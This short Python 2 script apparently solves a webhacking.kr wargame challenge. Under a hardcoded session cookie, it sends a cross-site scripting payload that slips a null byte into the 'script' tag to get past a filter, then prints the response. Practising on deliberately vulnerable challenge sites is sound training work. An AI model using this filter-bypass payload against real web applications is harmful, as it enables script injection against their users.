#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-3/"

CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
    
parameter = "<s%00cript>alert(1);</script>"
httpRequest = urllib2.Request(challengeUrl + "?code=" + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
